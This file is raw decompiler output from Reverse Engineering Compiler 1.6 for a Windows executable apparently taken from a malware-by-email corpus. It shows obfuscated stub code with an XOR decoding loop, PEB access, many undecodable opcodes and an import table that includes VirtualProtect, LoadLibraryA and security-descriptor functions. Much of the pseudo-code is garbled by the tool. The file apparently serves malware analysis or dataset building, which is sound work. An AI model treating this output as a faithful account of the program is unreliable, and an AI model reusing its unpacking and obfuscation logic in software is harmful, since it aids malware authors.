/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_2574/ia32_pe/subject.exe'
 */

stack space not deallocated on return
/*	Procedure: 0x0040113C - 0x00401185
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    (save)ebp;
    ebp = esp;
    esp = esp - 44;
    *(ebp - 24) = 0;
    eax = eax + 101;
    (save)0x401407;
    edi = *ebp;
    esi = esi + eax & ebx;
    (restore) *L0040FD9F;
    if(!(edx & ecx)) {
        esi = esi + eax;
        ebx = ebx + *ebp;
    }
    *L00404c34();
    edx = *L00403AD3;
    *L0040FC33 = *L0040FC33 + 1;
    *(ebp + 12) = *(ebp + 12) - esi;
    ebx = ebp;
    return(*__imp__SetLastConsoleEventActive());
}

stack space not deallocated on return
/*	Procedure: 0x00401186 - 0x0040120E
 *	Argument size: 20
 *	Local size: 0
 *	Save regs size: 0
 */

L00401186(A4, A8, A14)
/* unknown */ void  A4;
/* unknown */ void  A8;
/* unknown */ void  A14;
{



    eax = eax | 81;
    (save)A8;
    ecx = eax;
    ebx = A4 + 0x40118c | 0x40190b;
    esi = 90 - *L00403FD6 | ebx;
    ecx = *esp;
    *__imp__SetLastConsoleEventActive();
    (save) *L004033CD;
    *esp = ebx;
    edi = ebx;
    edx = edx + *L00405E7D;
    (save) *L00401132;
    (save)A8;
    if(ecx - 0x4021e9 == edx) {
        edx = edx - A14;
        ebx = A8;
    }
    edi = edi + 1;
    ecx = *esp;
    ebx = ebx - 4206238;
    edx = edx + 4204909;
    (save)ebx;
    L00401298();
    ecx = ecx - *esp;
    eax = *__imp__GetSystemInfo(edx);
    *L0040FF84 = edx;
    asm("xchg ecx,[esp]");
}

/*	Procedure: 0x0040120F - 0x0040122E
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040120F()
{



    *eax = *eax + al;
    *esi = *esi + dh;
    *eax = *eax + al;
    *esi = *esi + dh;
    esi = esi + 1;
    eax = eax + 1;
    asm("%s inc eax");
    *eax = *eax ^ eax;
    *(esi + 73) = *(esi + 73) + al;
    eax = eax ^ 1111440201;
    esp = esp + 1;
    esp = esp + 1;
    *edi :: edi;
    al :: 0;
    esp = esp + 1;
    edi = edi - 1;
    edx = edx + 1;
    *eax = *eax + al;
}

stack space not deallocated on return
/*	Procedure: 0x00401298 - 0x00401517
 *	Argument size: 20
 *	Local size: 0
 *	Save regs size: 0
 */

L00401298(A4, A14)
/* unknown */ void  A4;
/* unknown */ void  A14;
{



    (save)ebp;
    ebp = esp;
    (save)A4;
    eax = eax + 12;
    edi = "";
    ecx = ecx & edi;
    *L0040FD13 = eax;
    ecx = 0x404164;
    edi = 0x404164;
    ebx = 4204699 - edx;
    (save)A4;
    eax = 4398071;
    edi = *L7FFE0028;
    if(!(esi = 0x4015e0 + *L00404CCE)) {
        ebx = 0x401509 + ebp;
    }
    ebx = %ds:esp];
    *esp = ecx;
    eax = fs + fs;
    *L0040FF71 = *L0040FF71 + 1;
    if(eax != 76) {
        > ? L0040132d : ;
        A14 = A14 + ecx;
        *L0040FF61 = *L0040FF61 + ecx;
        eax = eax + 21;
        (save)ebp;
        (save)0x404cc3;
        ebx = ebx - 0x402365 - edx;
        (save)__imp__ReadFile;
        ebx = esi;
    }
    bh = bh + bl;
    edx = edx + 1;
    eax = *__imp__GetStdHandle() + *(edx + ecx * 4);
    (restore)edx;
    return;
    ecx = ecx | -1;
    *L0040FF77 = *L0040FF77 - ebx;
    edx = *%fs:0x30];
    *L0040FC07 = *L0040FC07 + ecx;
    if(!(bl = bl + 1)) {
        bl = bl + cl ^ 130;
    }
    (save)edx;
    ebx = ((ebx | 2059891) & esp) + edx - esp | 4284553;
    ebx = eax;
    (restore)eax;
    ebx = ebx + ebp;
    eax = *(eax + 44);
    ebx = ~eax | eax;
    cl = *(eax + 91);
    ebx = ebx & ebp;
    eax = eax >> 16;
    ebx = edx;
    if(!(ah = ah - cl)) {
        ecx = ecx + *esp;
        *L0040FD91 = *L0040FD91 - edx;
        asm("xchg eax,[esp]");
        eax = *__imp__SetFilePointer();
        (save)eax;
        ecx = 0x4043ed;
        return(ebp);
    }
    ebx = ebx ^ eax;
    ebx = eax;
    eax = ebx;
    eax = *(edx + 12);
    esi = *(eax + 28);
    bh = (%ds:esp] ^ 15) + 110;
    asm("lodsd");
    ebx = ebx & eax;
    eax = *(eax + 8);
    ebx = esp;
    ebx = eax + edi;
L004013c4:
    eax = eax + 1;
    ecx = *eax;
    ebx = 8 - ebp + edi;
    ecx = ecx & *(eax + 4);
    ebx = !ebx;
    if(ecx != 85463109) {
        goto L004013c4;
    }
    <= ? L004013e1 : ;
    ebx = ~ebx;
    ebx = ebx + ebp;
    asm("xchg eax,edx");
L004013e6:
    edx = edx - 1;
    ebx = eax + ecx;
    asm("sbb ebx,eax");
    eax = *edx;
    if(!(bh = bh + al)) {
        ebx = *esp;
    }
    eax = eax & 65535;
    ebx = ~ebx;
    if(eax = eax - 35669) {
        goto L004013e6;
    }
    *L0040FFC0 = edx;
    if(!(ebx = ~ebx | 7774337)) {
    }
    (save)4259781;
    bh = al ^ 183;
    eax = 64;
    (save)64;
    if(!(bl = bl - 1)) {
        ebx = ebx + 64;
    }
    (save)1729;
    (save)0x4012a3;
    (save)0;
    ebx = (1728 ^ eax) + al + ecx;
    asm("sbb ebx,edi");
    ebx = 4195602;
    asm("sbb ebx,eax");
    bx = ~bx;
    ecx = *L0040FFC0;
    eax = *ecx();
    if(!( *esp = *esp - 1)) {
        ebx = ebx - eax;
    }
    ebx = ebx | edi;
    ebx = esi;
    ecx = 164;
    ebx = eax + 164;
    edx = 0x401562;
L0040147b:
    ebx = edi;
    edi = 233;
    *edx = *edx ^ 233;
    eax = eax;
    esi = *edx;
    bh = 8421892;
    asm("sbb ebx,edx");
    esi = esi + 3;
    *edx = esi;
    if(!(ebx = ebx & esp)) {
        ebx = ebx ^ -18;
        ebx = edx;
    }
    edx = edx + -1;
    if(!(ebx = ebx + esi)) {
        ebx = eax + edi;
    }
    if(ecx = ecx - 1) {
        goto L0040147b;
    }
    if(!(bh = bh + bh)) {
        ebx = *esp;
        ebx = 0x402594;
    }
    asm("Unknown opcode 0x8c");
    bh :: al;
    asm("aam 0x14");
    asm("Unknown opcode 0xc6");
    (save)esp;
    *LF46F88C4 = dl;
    eax = eax & ebx;
    asm("hlt");
    al = *L2E76C3AD;
    ebp = ebp - 1;
    asm("adc al,0x6e");
    eax = -429791032;
    asm("sbb eax,0xfa0e5726");
    (save)edi;
    asm("%c cli");
    asm("sbb eax,0x69286126");
    (save)esp;
    asm("cld");
    (save)ecx;
    (save)ss;
    asm("cli");
    (restore)esp;
    asm("adc eax,0xfc6f3ed9");
    ah = ah & bh;
    *(esi + ebp * 2) = *(esi + ebp * 2) ^ dl;
    *LA21B8DCB = *LA21B8DCB - -1575252617;
    asm("enter 0xf551,0xfb");
    asm("aam 0x14");
    asm("insb");
    asm("cld");
    asm("popa");
    al & 200;
    asm("loopne 0x40157d");
    asm("%f pop esp");
    asm("adc al,0x15");
    asm("adc eax,0x772954c6");
    asm("iret");
}

/*	Procedure: 0x00401518 - 0x0040157C
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401518()
{



    *edi = eax;
    edi = edi + 4;
    esi = esi + 1;
    al = al & 160;
    *(edi + 20) = *(edi + 20) + dl;
    (restore)ebp;
    650515668 = esi * eax;
    (restore)edi;
    edx = gs;
    asm("adc al,0x15");
    asm("xchg eax,ebp");
    (fsave)(frestore) - st4;
    asm("Unknown opcode 0x8f");
    asm("xchg eax,esp");
    ah = ah << 22;
    asm("xlatb");
    *edi = *edi << 1;
    asm("wait");
    asm("sbb [esp+ebp*2+0x8d14d4e6],ecx");
    asm("aam 0x14");
    asm("adc eax,0xe4c88d15");
    asm("adc al,0x15");
    esp = esi;
    asm("Unknown opcode 0xdc");
    asm("aam 0x14");
    asm("Unknown opcode 0x8f");
    asm("adc eax,0xd415545c");
    asm("adc al,0x12");
    asm("in al,0x8c");
    asm("Unknown opcode 0x26");
    asm("Unknown opcode 0xdc");
    asm("aam 0x14");
    (save)esi;
    asm("cwde");
    asm("out 0x79,al");
    *edi = eax;
    edi = edi + 4;
    asm("frstor [ebp+0xc7a5]");
    *eax = *eax + al;
    esi = esi + 1;
    *ebx = *ebx + dh;
    *(eax + eax) = *(eax + eax) + dh;
    eax = eax - 1;
    edi = edi - 1;
    *ecx = *ecx + dh;
    *eax = *eax ^ al;
    ebp = ebp + 1;
    eax = eax ^ *eax;
    *L363C3D00 = *L363C3D00 + bh;
    *L363C3D00 = *L363C3D00 + bh;
}

/* address  size  */
/* 0x00401000       0 */ /* unknown */ void 	__imp__DeleteCriticalSection;
/* 0x00401004       0 */ /* unknown */ void 	__imp__TlsSetValue;
/* 0x00401008       0 */ /* unknown */ void 	__imp__GetFileSize;
/* 0x0040100c       0 */ /* unknown */ void 	__imp__CloseHandle;
/* 0x00401010       0 */ /* unknown */ void 	__imp__GetFileType;
/* 0x00401014       0 */ /* unknown */ void 	__imp__SetFilePointer;
/* 0x00401018       0 */ /* unknown */ void 	__imp__SetLastConsoleEventActive;
/* 0x0040101c       0 */ /* unknown */ void 	__imp__GetSystemTime;
/* 0x00401020       0 */ /* unknown */ void 	__imp__InitializeCriticalSection;
/* 0x00401024       0 */ /* unknown */ void 	__imp__CreateFileA;
/* 0x00401028       0 */ /* unknown */ void 	__imp__WideCharToMultiByte;
/* 0x0040102c       0 */ /* unknown */ void 	__imp__LeaveCriticalSection;
/* 0x00401030       0 */ /* unknown */ void 	__imp__EnterCriticalSection;
/* 0x00401034       0 */ /* unknown */ void 	__imp__ReadFile;
/* 0x00401038       0 */ /* unknown */ void 	__imp__GetStdHandle;
/* 0x0040103c       0 */ /* unknown */ void 	__imp__SetEndOfFile;
/* 0x00401040       0 */ /* unknown */ void 	__imp__WriteFile;
/* 0x00401044       0 */ /* unknown */ void 	__imp__TlsGetValue;
/* 0x0040104c       0 */ /* unknown */ void 	__imp__MonitorFromRect;
/* 0x00401050       0 */ /* unknown */ void 	__imp__OpenInputDesktop;
/* 0x00401054       0 */ /* unknown */ void 	__imp__GetCapture;
/* 0x0040105c       0 */ /* unknown */ void 	__imp__VariantClear;
/* 0x00401060       0 */ /* unknown */ void 	__imp__VariantCopyInd;
/* 0x00401064       0 */ /* unknown */ void 	__imp__SysAllocStringLen;
/* 0x00401068       0 */ /* unknown */ void 	__imp__VariantChangeTypeEx;
/* 0x0040106c       0 */ /* unknown */ void 	__imp__SysStringLen;
/* 0x00401074       0 */ /* unknown */ void 	__imp__LoadLibraryA;
/* 0x00401078       0 */ /* unknown */ void 	__imp__LockResource;
/* 0x0040107c       0 */ /* unknown */ void 	__imp__SetFilePointer;
/* 0x00401080       0 */ /* unknown */ void 	__imp__SetEndOfFile;
/* 0x00401084       0 */ /* unknown */ void 	__imp__SetVolumeLabelW;
/* 0x00401088       0 */ /* unknown */ void 	__imp__IsDBCSLeadByte;
/* 0x0040108c       0 */ /* unknown */ void 	__imp__GetSystemDefaultLCID;
/* 0x00401090       0 */ /* unknown */ void 	__imp__SetErrorMode;
/* 0x00401094       0 */ /* unknown */ void 	__imp__GetSystemInfo;
/* 0x00401098       0 */ /* unknown */ void 	__imp__GetFullPathNameA;
/* 0x0040109c       0 */ /* unknown */ void 	__imp__GetLocaleInfoA;
/* 0x004010a0       0 */ /* unknown */ void 	__imp__GetConsoleFontSize;
/* 0x004010a4       0 */ /* unknown */ void 	__imp__LoadResource;
/* 0x004010a8       0 */ /* unknown */ void 	__imp__Sleep;
/* 0x004010ac       0 */ /* unknown */ void 	__imp__GetExitCodeProcess;
/* 0x004010b0       0 */ /* unknown */ void 	__imp__GlobalHandle;
/* 0x004010b4       0 */ /* unknown */ void 	__imp__GetVersionExA;
/* 0x004010b8       0 */ /* unknown */ void 	__imp__RemoveDirectoryA;
/* 0x004010bc       0 */ /* unknown */ void 	__imp__ClearCommError;
/* 0x004010c0       0 */ /* unknown */ void 	__imp__GlobalCompact;
/* 0x004010c4       0 */ /* unknown */ void 	__imp__ReadConsoleOutputW;
/* 0x004010c8       0 */ /* unknown */ void 	__imp__GetWindowsDirectoryA;
/* 0x004010cc       0 */ /* unknown */ void 	__imp__SizeofResource;
/* 0x004010d0       0 */ /* unknown */ void 	__imp__VirtualProtect;
/* 0x004010d4       0 */ /* unknown */ void 	__imp__GetModuleFileNameA;
/* 0x004010d8       0 */ /* unknown */ void 	__imp__WriteFile;
/* 0x004010dc       0 */ /* unknown */ void 	__imp__SetConsoleScreenBufferSize;
/* 0x004010e0       0 */ /* unknown */ void 	__imp__GetFileSize;
/* 0x004010e4       0 */ /* unknown */ void 	__imp__GetSystemTime;
/* 0x004010e8       0 */ /* unknown */ void 	__imp__VirtualQuery;
/* 0x004010ec       0 */ /* unknown */ void 	__imp__GlobalGetAtomNameA;
/* 0x004010f0       0 */ /* unknown */ void 	__imp__GetUserDefaultLangID;
/* 0x004010f4       0 */ /* unknown */ void 	__imp__GetCommandLineA;
/* 0x004010f8       0 */ /* unknown */ void 	__imp__FindNextChangeNotification;
/* 0x004010fc       0 */ /* unknown */ void 	__imp__ReadFile;
/* 0x00401100       0 */ /* unknown */ void 	__imp__GetFileAttributesA;
/* 0x00401104       0 */ /* unknown */ void 	__imp__SetLastError;
/* 0x0040110c       0 */ /* unknown */ void 	__imp__SetFileSecurityA;
/* 0x00401110       0 */ /* unknown */ void 	__imp__AddAccessAllowedAceEx;
/* 0x00401114       0 */ /* unknown */ void 	__imp__RegLoadKeyW;
/* 0x00401118       0 */ /* unknown */ void 	__imp__AddAccessDeniedAceEx;
/* 0x0040111c       0 */ /* unknown */ void 	__imp__RegOpenKeyA;
/* 0x0040113c       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
